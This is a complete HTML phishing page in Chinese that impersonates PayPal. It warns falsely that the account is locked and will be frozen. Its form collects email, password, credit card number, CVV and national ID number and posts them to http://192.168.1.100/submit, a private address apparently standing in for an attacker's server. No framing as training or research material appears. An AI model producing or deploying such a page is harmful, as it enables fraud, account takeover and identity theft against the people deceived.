<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal - 验证您的账户</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0070ba 0%, #003087 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
            width: 400px;
            padding: 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #003087;
            font-size: 32px;
            font-weight: 700;
        }
        .logo span { color: #0070ba; }
        h2 {
            color: #333;
            font-size: 18px;
            text-align: center;
            margin-bottom: 20px;
        }
        .alert {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #856404;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 13px;
            color: #666;
            margin-bottom: 6px;
        }
        input {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #0070ba;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #0070ba;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #003087;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        .footer a {
            color: #0070ba;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Pay<span>Pal</span></h1>
        </div>

        <h2>账户验证</h2>

        <div class="alert">
            ⚠️ 您的账户已被锁定！请立即验证您的身份信息，否则账户将被永久冻结。
        </div>

        <form action="http://192.168.1.100/submit" method="POST">
            <div class="form-group">
                <label>邮箱地址</label>
                <input type="email" name="email" placeholder="请输入您的邮箱">
            </div>
            <div class="form-group">
                <label>密码</label>
                <input type="password" name="password" placeholder="请输入密码">
            </div>
            <div class="form-group">
                <label>信用卡号</label>
                <input type="text" name="card_number" placeholder="请输入信用卡号">
            </div>
            <div class="form-group">
                <label>安全码 (CVV)</label>
                <input type="text" name="cvv" placeholder="3位安全码" maxlength="3">
            </div>
            <div class="form-group">
                <label>身份证号</label>
                <input type="text" name="id_number" placeholder="请输入身份证号">
            </div>
            <button type="submit" class="btn">立即验证</button>
        </form>

        <div class="footer">
            <p>PayPal © 2024 All rights reserved.</p>
            <p><a href="#">服务条款</a> | <a href="#">隐私政策</a></p>
        </div>
    </div>
</body>
</html>
